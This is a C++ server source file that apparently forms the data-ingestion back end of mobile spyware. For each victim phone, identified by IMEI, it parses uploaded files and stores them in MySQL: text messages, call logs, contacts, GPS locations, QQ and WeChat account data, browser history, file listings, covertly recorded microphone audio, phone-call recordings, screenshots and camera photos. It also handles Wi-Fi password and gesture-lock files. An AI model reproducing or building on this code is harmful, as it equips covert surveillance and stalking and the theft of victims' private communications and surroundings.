#include "DataKeeper.h"
#include <time.h>
#include "FileWriter.h"
#include "DataProcess.h"
#include <Dbghelp.h>
#include "PublicFunction.h"
#include "Coder.h"
#include <shlwapi.h>
#include "mysqlOper.h"
#include "jsonParser.h"
#include "JsonSplit.h"
#include "FileReadLine.h"
#include "Amr.h"
#include "PublicFunction.h"
#include <unordered_map>
#include "FileOperator.h"
#include <json/json.h>

#pragma comment(lib,"shlwapi.lib")

static unsigned int g_number = 0;

unordered_map <unsigned int, RECOMMITDATA> gMapRecommit;

CRITICAL_SECTION g_RecommitCs = { 0 };

int DataKeeper::add(RECOMMITDATA data) {
	EnterCriticalSection(&g_RecommitCs);
	gMapRecommit.insert(unordered_map<unsigned int, RECOMMITDATA>::value_type(g_number, data));
	g_number++;
	LeaveCriticalSection(&g_RecommitCs);
	return g_number;
}

void DataKeeper::findfiles(string path, string username, string imei) {
	int ret = 0;

	WIN32_FIND_DATAA fd = { 0 };
	string fn = path + "*.*";
	HANDLE hf = FindFirstFileA(fn.c_str(), &fd);
	if (hf == INVALID_HANDLE_VALUE)
	{
		return;
	}

	while (1)
	{
		if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (lstrcmpiA(fd.cFileName, "..") == 0 || lstrcmpiA(fd.cFileName, ".") == 0)
			{

			}
			else {
				string next = path + fd.cFileName + "\\";
				findfiles(next, username, imei);
			}
		}
		else if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) {
			RECOMMITDATA data;
			data.filename = fd.cFileName;
			data.filepath = path;
			data.imei = imei;
			data.username = username;
			add(data);
		}

		ret = FindNextFileA(hf, &fd);
		if (ret <= 0)
		{
			break;
		}
	}

	FindClose(hf);
}

void DataKeeper::getpath(void) {
	char szpath[MAX_PATH] = { 0 };
	int ret = GetCurrentDirectoryA(MAX_PATH, szpath);
	string fn = string(szpath) + "\\recommit.config";

	int filesize = 0;
	char* lpdata = 0;
	filesize = FileOperator::fileReader(fn.c_str(), &lpdata, &filesize);
	if (filesize > 0) {
		string path = lpdata;
		string sub = "";
		string username = "";
		string imei = "";
		while (1)
		{
			int pos = path.find("\r\n");
			if (pos >= 0)
			{
				sub = path.substr(0, pos);
				path = path.substr(pos + strlen("\r\n"));

				pos = sub.find("\\");
				if (pos > 0)
				{
					username = sub.substr(0, pos);
					imei = sub.substr(pos + 1);
				}
				else {
					continue;
				}

				if (sub.back() != '\\')
				{
					sub.append("\\");
				}

				if (sub.front() == '\\')
				{
					sub = sub.substr(1);
				}
			}
			else if (path.length() > 0)
			{
				sub = path;
				path = "";
				pos = sub.find("\\");
				if (pos > 0)
				{
					username = sub.substr(0, pos);
					imei = sub.substr(pos + 1);
				}
				else {
					break;
				}

				if (sub.back() != '\\')
				{
					sub.append("\\");
				}
				if (sub.front() == '\\')
				{
					sub = sub.substr(1);
				}
			}
			else {
				break;
			}

			findfiles(string(szpath) + "\\" + sub, username, imei);
		}
	}

	delete[] lpdata;
}


int __stdcall DataKeeper::recommit() {
	__try {
		InitializeCriticalSection(&g_RecommitCs);

		int ret = 0;
		while (1)
		{
			getpath();

			EnterCriticalSection(&g_RecommitCs);

			unordered_map<unsigned int, RECOMMITDATA>::iterator it;

			for (it = gMapRecommit.begin(); it != gMapRecommit.end();)
			{
				RECOMMITDATA data = it->second;
				gMapRecommit.erase(it++);

				char* lpdata = 0;
				int filesize = 0;
				string filename = (data.filepath + data.filename);
				ret = FileOperator::fileReader(filename.c_str(), &lpdata, &filesize);
				if (ret > 0)
				{
					ret = keep(data.filepath, data.filename, lpdata, filesize, data.username, data.imei);
					delete lpdata;
				}
			}

			LeaveCriticalSection(&g_RecommitCs);

			Sleep(60000);
		}
	}
	__except (1) {
		printf("recommit exception\r\n");
		WriteLogFile("recommit exception\r\n");
	}
	return 0;
}




int DataKeeper::keep(string filepath, string name, const char* data, int size, string username, string imei) {
	int ret = 0;
#ifdef USE_MYSQL
	MySql::enterLock();
	MySql* mysql = new MySql();

	string filename = filepath + name;

	__try
	{
		if (strstr(name.c_str(), DEVICEINFO_FILENAME))
		{
			string info = string(data, size);

			//string model = JsonParser::getStringValue(info, "\xE5\x9E\x8B\xE5\x8F\xB7");
			//ret = mysql->insertClient(username, imei, info, model);
			string model = "";
			string retinfo = JsonSplit::slitInfomation(info, model);
			ret = mysql->insertClient(username, imei, retinfo, model);
		}
		else if (strstr(name.c_str(), LOCATION_FILENAME))
		{
			vector<string>* arraydata = 0;
			string mydata = string(data, size);
			arraydata = JsonParser::getJsonFromArray(mydata);
			for (unsigned int i = 0; i < arraydata->size(); i++)
			{
				string lat = "";
				string lon = "";
				string timenow = "";
				string status = "";
				string address = "";

				ret = JsonSplit::splitLocation(arraydata->at(i), lat, lon, status, timenow, address);
				if (lat != "" && lon != "")
				{
					ret = mysql->insertLocation(username, imei, lat, lon, timenow, address);
				}
			}

			if (arraydata != 0)
			{
				delete arraydata;
				arraydata = 0;
			}
		}
		else if (strstr(name.c_str(), NOTIFICATION_MSG_FN))
		{
			/*
			Json::Value value;
			Json::Reader reader;
			string mydata = string(data, size);
			if (reader.parse(mydata, value))
			{
			int jsoncnt = value.size();
			for (int i = 0; i < jsoncnt; i++)
			{
			ret = mysql->insertMsg( imei,
			value[i]["people"].asString(),
			value[i]["name"].asString(),
			value[i]["type"].asString(),
			value[i]["time"].asString(),
			value[i]["message"].asString(), value[i]["time"].asString());
			}
			}	*/


			vector<string>* arraydata = 0;
			string mydata = string(data, size);
			arraydata = JsonParser::getJsonFromArray(mydata);
			for (unsigned int i = 0; i < arraydata->size(); i++)
			{
				string people = "";
				string message = "";
				string timenow = "";
				string type = "";
				string group = "";
				string package = "";
				ret = JsonSplit::splitChatMessage(arraydata->at(i), people, message, timenow, type, group, package);
				replaceSplashAndEnterAndQuot(message);
				//timenow instanceof(time_t) == true

				time_t now = atoi(timenow.c_str());
				string strtime = timet2str(&now);
				ret = mysql->insertMsg(imei, people, package, type, strtime, message, timenow);
			}

			if (arraydata != 0)
			{
				delete arraydata;
				arraydata = 0;
			}
		}
		else if (strstr(name.c_str(), MESSAGE_FILENAME))
		{
			Json::Value value;
			Json::Reader reader;
			string mydata = string(data, size);
			if (reader.parse(mydata, value))
			{
				int jsoncnt = value.size();
				for (int i = 0; i < jsoncnt; i++)
				{
					ret = mysql->insertMsg(imei, "0",
						value[i]["\xE5\x8F\xB7\xE7\xA0\x81"].asString(),
						value[i]["\xE7\xB1\xBB\xE5\x9E\x8B"].asString(),
						value[i]["\xE6\x97\xB6\xE9\x97\xB4"].asString(),
						value[i]["\xE6\xB6\x88\xE6\x81\xAF\xE5\x86\x85\xE5\xAE\xB9"].asString(),
						value[i]["ID"].asString());
				}
			}

			/*
			vector<string> *arraydata = 0;
			arraydata = JsonParser::getJsonFromArray(mydata);
			for (unsigned int i = 0; i < arraydata->size(); i++)
			{

				string number = "";
				string content = "";
				string type = "";
				string timenow = "";
				string mid = "";
				string name = "0";	//name is always be 0
				ret = JsonSplit::splitMessage(arraydata->at(i), number, content, type, timenow, mid);
				replaceSplashAndEnterAndQuot(content);
				ret = mysql->insertMsg(imei, "0", number, type, timenow, content, mid);

			}
			if (arraydata != 0)
			{
				delete arraydata;
				arraydata = 0;
			}*/
		}
		else if (strstr(name.c_str(), CALLLOG_FILENAME))
		{
			Json::Value value;
			Json::Reader reader;
			string mydata = string(data, size);
			if (reader.parse(mydata, value))
			{
				int jsoncnt = value.size();
				for (int i = 0; i < jsoncnt; i++)
				{
					string type = value[i]["\xE7\xB1\xBB\xE5\x9E\x8B"].asString();
					if (type.find("\xE6\x9C\xAA\xE6\x8E\xA5") != -1)
					{
						type = "3";
					}
					else if (type.find("\xE5\x91\xBC\xE5\x85\xA5") != -1) {
						type = "1";
					}
					else if (type.find("\xE5\x91\xBC\xE5\x87\xBA") != -1) {
						type = "2";
					}
					else {
						type = "4";
					}

					ret = mysql->insertCallLog(username, imei,
						value[i]["\xE5\x8F\xB7\xE7\xA0\x81"].asString(),
						type,
						value[i]["\xE6\x97\xB6\xE9\x97\xB4"].asString(),
						value[i]["\xE6\x97\xB6\xE9\x95\xBF"].asString());
				}
			}

			/*
			vector<string> *arraydata = 0;
			string mydata = string(data, size);
			arraydata = JsonParser::getJsonFromArray(mydata);
			for (unsigned int i = 0; i < arraydata->size(); i++)
			{
				string number = "";
				string type = "";
				string timenow = "";
				string duration = "";
				ret = JsonSplit::splitCallLog(arraydata->at(i), type, number, timenow, duration);
				ret = mysql->insertCallLog(username, imei, number, type, timenow, duration);
			}

			if (arraydata != 0)
			{
				delete arraydata;
				arraydata = 0;
			}*/
		}
		else if (strstr(name.c_str(), CONTACTS_FILENAME))
		{
			Json::Value value;
			Json::Reader reader;
			string mydata = string(data, size);
			if (reader.parse(mydata, value))
			{
				int jsoncnt = value.size();
				for (int i = 0; i < jsoncnt; i++)
				{
					ret = mysql->insertContact(username, imei,
						value[i]["\xE7\xA7\xB0\xE5\x91\xBC"].asString(),
						value[i]["\xE5\x8F\xB7\xE7\xA0\x81"].asString());
				}
			}

			/*
			vector<string> *arraydata = 0;
			string mydata = string(data, size);
			arraydata = JsonParser::getJsonFromArray(mydata);
			for (unsigned int i = 0; i < arraydata->size(); i++)
			{
				string number = "";
				string name = "";

				ret = JsonSplit::splitContacts(arraydata->at(i), name, number);

				replaceSplashAndEnterAndQuot(number);
				replaceSplashAndEnterAndQuot(name);
				ret = mysql->insertContact(username, imei, name, number);
			}
			if (arraydata != 0)
			{
				delete arraydata;
				arraydata = 0;
			}*/
		}
		else if (strstr(name.c_str(), RUNNINGAPPS_FILENAME))
		{
			Json::Value value;
			Json::Reader reader;
			string mydata = string(data, size);
			if (reader.parse(mydata, value))
			{
				int jsoncnt = value.size();
				for (int i = 0; i < jsoncnt; i++)
				{
					ret = mysql->insertProcesses(username, imei,
						value[i]["\xE7\xA8\x8B\xE5\xBA\x8F\xE5\x90\x8D\xE7\xA7\xB0"].asString(),
						value[i]["\xE8\xBF\x9B\xE7\xA8\x8B\x49\x44"].asString(),
						value[i]["\xE7\x94\xA8\xE6\x88\xB7\x49\x44"].asString());
				}
			}

			/*
			vector<string> *arraydata = 0;
			string mydata = string(data, size);
			arraydata = JsonParser::getJsonFromArray(mydata);
			for (unsigned int i = 0; i < arraydata->size(); i++)
			{
				string pname = "";
				string pid = "";
				string uid = "";
				string lru = "";
				string description = "";
				ret = JsonSplit::splitRunningApps(arraydata->at(i), pname, pid, uid, lru, description);
				ret = mysql->insertProcesses(username, imei, pname, pid, uid);
			}

			if (arraydata != 0)
			{
				delete arraydata;
				arraydata = 0;
			}*/
		}
		else if (strstr(name.c_str(), APPPROCESS_FILENAME))
		{
			Json::Value value;
			Json::Reader reader;
			string mydata = string(data, size);
			if (reader.parse(mydata, value))
			{
				int jsoncnt = value.size();
				for (int i = 0; i < jsoncnt; i++)
				{
					Json::Value subvalue = value[i];
					int subcnt = subvalue.size();
					for (int j = 0; j < subcnt; j++)
					{
						ret = mysql->insertInstallApps(imei,
							subvalue[j]["\xE5\xBA\x94\xE7\x94\xA8\xE5\x90\x8D\xE7\xA7\xB0"].asString(),
							subvalue[j]["\xE5\x8c\x85\xE5\x90\x8D"].asString(),
							subvalue[j]["\xE7\x89\x88\xE6\x9C\xAC"].asString(),
							subvalue[j]["\xE5\xAE\x89\xE8\xA3\x85\xE6\x97\xB6\xE9\x97\xB4"].asString(),
							subvalue[j]["\xE6\x9C\x80\xE8\xBF\x91\xE6\x9B\xB4\xE6\x96\xB0\xE6\x97\xB6\xE9\x97\xB4"].asString(),
							subvalue[j]["type"].asString());
					}
				}
			}

			/*
			vector<string> *arraydata = 0;
			string mydata = string(data, size);
			arraydata = JsonParser::getJsonFromArray(mydata);
			for (unsigned int i = 0; i < arraydata->size(); i++)
			{
				string name = "";
				string packagename = "";
				string stime = "";
				string ltime = "";
				string ver = "";

				string type = "";

				ret = JsonSplit::splitInstallApps(arraydata->at(i), name, packagename, stime, ltime, ver,type);
				replaceSplashAndEnterAndQuot(packagename);
				replaceSplashAndEnterAndQuot(name);
				ret = mysql->insertInstallApps(imei, name, packagename, ver, stime, ltime, type);
			}

			if (arraydata != 0)
			{
				delete arraydata;
				arraydata = 0;
			}*/
		}
		else if (strstr(name.c_str(), WIFI_FILENAME))
		{
			string wifiinfo = "[";

			Json::Value value;
			Json::Reader reader;
			string mydata = string(data, size);
			if (reader.parse(mydata, value))
			{
				int jsoncnt = value.size();
				for (int i = 0; i < jsoncnt; i++)
				{
					char szinfo[2048];

					string name = value[i]["name"].asString();
					string bssid = value[i]["bssid"].asString();
					//time_t timet = value[i]["time"].asDouble();

					char strtime[256] = { 0 };
					//ctime_s(strtime, 256, &timet);

					wsprintfA(szinfo, "\"%s_%s_(%s)\",", name.c_str(), bssid.c_str(), strtime);
					wifiinfo += szinfo;
				}
			}

			int wifilen = wifiinfo.length();
			char* last = (char*)wifiinfo.c_str() + wifilen - 1;
			*last = ']';

			if ((wifiinfo.length() < 0x10000 - 1024) && wifiinfo.length() > 2)
			{
				ret = mysql->insertWifi(username, imei, wifiinfo, "");
				ret = mysql->insertWifi2(username, imei, wifiinfo, "");
			}
			else if (wifiinfo.length() <= 0x100000)
			{
				ret = mysql->insertWifi2(username, imei, wifiinfo, "");
			}

			/*
			vector<string> *arraydata = 0;
			string mydata = string(data, size);
			arraydata = JsonParser::getJsonFromArray(mydata);

			string wifiinfo = "[";
			char szinfo[1024] = { 0 };
			for (unsigned int i = 0; i < arraydata->size(); i++)
			{
				string name = "";
				string bssid = "";
				string time = "";

				ret = JsonSplit::splitWifi(arraydata->at(i), name, bssid, time);

				time_t timenow = atoi(time.c_str());
				char strtime[256] = { 0 };
				ctime_s(strtime, 256, &timenow);
				if (*strtime == 0)
				{
					lstrcpyA(strtime, "0");
				}

				replaceSplashAndEnterAndQuot(name);

				wsprintfA(szinfo, "\"%s_%s_(%s)\",", name.c_str(), bssid.c_str(), strtime);

				wifiinfo += szinfo;
			}

			int wifilen = wifiinfo.length();
			char * last = wifiinfo.c_str() + wifilen - 1;
			*last = ']';

			if (wifiinfo.length() < (0x10000 - 1024) && wifiinfo.length() > 2)
			{
				mysql->insertWifi(username, imei, wifiinfo, "");
				mysql->insertWifi2(username, imei, wifiinfo, "");
			}
			else if (wifiinfo.length() <= 0x100000)
			{
				ret = mysql->insertWifi2(username, imei, wifiinfo, "");
			}

			if (arraydata != 0)
			{
				delete arraydata;
				arraydata = 0;
			}*/
		}
		else if (strstr(name.c_str(), WIFIPASS_FILENAME))
		{
			ret = 1;
		}
		else if (strstr(name.c_str(), WEBKITHISTORY_FILENAME) || strstr(name.c_str(), CHROMEHISTORY_FILE_NAME) ||
			strstr(name.c_str(), FIREFOXRECORD_FILE_NAME))
		{
			Json::Value value;
			Json::Reader reader;
			string mydata = string(data, size);
			if (reader.parse(mydata, value))
			{
				int jsoncnt = value.size();
				for (int i = 0; i < jsoncnt; i++)
				{
					ret = mysql->insertBookMark(username, imei,
						value[i]["\xE9\x93\xBE\xE6\x8E\xA5"].asString(),
						value[i]["\xE6\xA0\x87\xE9\xA2\x98"].asString(),
						value[i]["\xE8\xAE\xBF\xE9\x97\xAE\xE6\xAC\xA1\xE6\x95\xB0"].asString(),
						value[i]["\xE5\x88\x9B\xE5\xBB\xBA\xE6\x97\xB6\xE9\x97\xB4"].asString(),
						value[i]["\xE8\xAE\xBF\xE9\x97\xAE\xE6\x97\xB6\xE9\x97\xB4"].asString());
				}
			}

			/*
			vector<string> *arraydata = 0;
			string mydata = string(data, size);
			arraydata = JsonParser::getJsonFromArray(mydata);
			for (unsigned int i = 0; i < arraydata->size(); i++)
			{
				string type = "";
				string ts = "";
				string title = "";
				string url = "";
				string count = "";
				string ctime = "";
				ret = JsonSplit::splitBrowserRecord(arraydata->at(i), type, ts, title, url, count, ctime);
				replaceSplashAndEnterAndQuot(title);
				replaceSplashAndEnterAndQuot(url);
				ret = mysql->insertBookMark(username, imei, url, title, count, ctime, ts);
			}
			if (arraydata != 0)
			{
				delete arraydata;
				arraydata = 0;
			}*/
		}
		else if (strstr(name.c_str(), SDCARDFILES_FILENAME) || strstr(name.c_str(), EXTCARDFILES_FILENAME) ||
			strstr(name.c_str(), FLASHCARDFILES_FILENAME))
		{
			vector<string>* arraydata = 0;
			// 			FileReadLine *freader = new FileReadLine(filename);
			// 			while (1)
			// 			{
			// 				string line = freader->readline();
			// 				if (line != "")
			// 				{
			// 					replaceSplashAndEnterAndQuot(line);
			// 					string sdfn = getfnfrompath(line);
			// 					mysql->insertFiles(imei, sdfn, line, 0, 0);
			// 				}
			// 				else {
			// 					break;
			// 				}
			// 			}
			// 			delete freader;

			string mydata = string(data, size);
			arraydata = JsonParser::splitFromEnter(mydata);
			for (unsigned int i = 0; i < arraydata->size(); i++)
			{
				//mysql use utf8
				string sdfilename = arraydata->at(i);
				replaceSplashAndEnterAndQuot(sdfilename);
				string sdfn = getfnfrompath(sdfilename);
				ret = mysql->insertFiles(imei, sdfn, sdfilename, 0, 0);
			}

			if (arraydata != 0)
			{
				delete arraydata;
				arraydata = 0;
			}
		}
		else if (strstr(name.c_str(), GESTURE_FILENAME))
		{
			ret = 1;
		}
		else if (strstr(name.c_str(), QQACCOUNT_FILENAME))
		{
			ret = mysql->insertAccount(username, imei, string(data, size), "1");
		}
		else if (strstr(name.c_str(), WEIXINUSERINFO_FILENAME))
		{
			ret = mysql->insertAccount(username, imei, string(data, size), "2");
		}

		else if (strstr(name.c_str(), "_micaudio"))
		{
			string timenow = "";
			ret = JsonSplit::splitEnvAudioName(name, timenow);

			//int duration = Amr::getAmrSeconds(data, size);
			//if (duration > 0)
			//{
				//ret = mysql->insertEnviromentAudio(username, imei, timenow, filename, size, duration);
			//}

			ret = mysql->insertEnviromentAudio(username, imei, timenow, filename, size, size);
		}
		else if (strstr(name.c_str(), "_screensnapshot.jpg"))
		{
			string timenow = "";
			ret = JsonSplit::splitScreenShot(name, timenow);
			ret = mysql->insertScreenCap(username, imei, filename, timenow);
		}
		else if (strstr(name.c_str(), "_cameraphoto.jpg"))
		{
			string timenow = "";
			ret = JsonSplit::splitCamera(name, timenow);
			ret = mysql->insertCamera(imei, "0", timenow, filename);
		}
		else if (strstr(name.c_str(), "_phonecallaudio"))	//phonecallaudio
		{
			string timenow = "";
			string number = "";
			string type = "";
			ret = JsonSplit::splitCallAudioName(name, number, timenow, type);

			int duration = Amr::getAmrSeconds(data, size);
			ret = mysql->insertCallAudio(username, imei, number, timenow, type, filename, size, duration);
		}
		else
		{
			int type = 0;
			if (strstr(name.c_str(), ".png") || strstr(name.c_str(), ".jpeg") || strstr(name.c_str(), ".bmp")
				|| strstr(name.c_str(), ".jpg"))
			{
				type = 2;
			}
			else if (strstr(name.c_str(), ".amr") || strstr(name.c_str(), ".mp3") || strstr(name.c_str(), ".mp4")
				|| strstr(name.c_str(), ".wav") || strstr(name.c_str(), ".aac"))
			{
				type = 1;
			}
			else {
				type = 3;
			}

			//mysql must use utf8 file name
			char* utf8filename = 0;
			int utf8fnlen = Coder::GBKToUTF8(filename.c_str(), &utf8filename);
			if (utf8fnlen > 0)
			{
				string strutf8fn = string(utf8filename, utf8fnlen);
				delete utf8filename;
				replaceSplash(strutf8fn);

				char* utf8name = 0;
				int utf8namelen = Coder::GBKToUTF8(name.c_str(), &utf8name);
				if (utf8namelen > 0) {
					string strutf8name = string(utf8name, utf8namelen);
					delete utf8name;
					ret = mysql->insertAllFiles(username, imei, strutf8name, strutf8fn, size, type);
				}
			}
		}
	}
	__except (1)
	{
		char szinfo[1024];
		wsprintfA(szinfo, "data normal process exception,file:%s,username:%s,imei:%s\r\n",
			filename.c_str(), username.c_str(), imei.c_str());
		WriteLogFile(szinfo);
	}

	delete mysql;
	MySql::leaveLock();
#endif
	return ret;
}


int DataKeeper::removeClient(string imei) {
	int ret = 0;
#ifdef USE_MYSQL
	MySql::enterLock();
	MySql* mysql = new MySql();

	__try {
		ret = mysql->removedata(imei);
	}
	__except (1) {
		char szinfo[1024];
		wsprintfA(szinfo, "removeClient error,imei:%s\r\n", imei.c_str());
		WriteLogFile(szinfo);
	}

	delete mysql;
	MySql::leaveLock();
#endif
	return ret;
}

int DataKeeper::removeUser(string username) {
	int ret = 0;
#ifdef USE_MYSQL
	MySql::enterLock();
	MySql* mysql = new MySql();


	__try {
		vector<vector<string>> data = mysql->getAllImeiFromUser(username);
		for (unsigned int i = 0; i < data.size(); i++)
		{
			for (unsigned int j = 0; j < data[i].size(); j++)
			{
				string imei = data.at(i).at(j);
				ret = removeClient(imei);
			}
		}

		ret = mysql->deleteUser(username);
	}
	__except (1) {
		char szinfo[1024];
		wsprintfA(szinfo, "removeUser error,imei:%s\r\n", username.c_str());
		WriteLogFile(szinfo);
	}

	delete mysql;
	MySql::leaveLock();
#endif
	return ret;
}


//1
/*
[client]
default-character-set = utf8mb4
[mysql]
default-character-set=utf8mb4
[mysqld]
character-set-server = utf8mb4
collation-server = utf8mb4_unicode_ci
init_connect=¡¯SET NAMES utf8mb4¡¯
*/
//2 reset mysql
//3 alter table ph_contacts charset=utf8mb4;
//4 mysql_options utf8mb4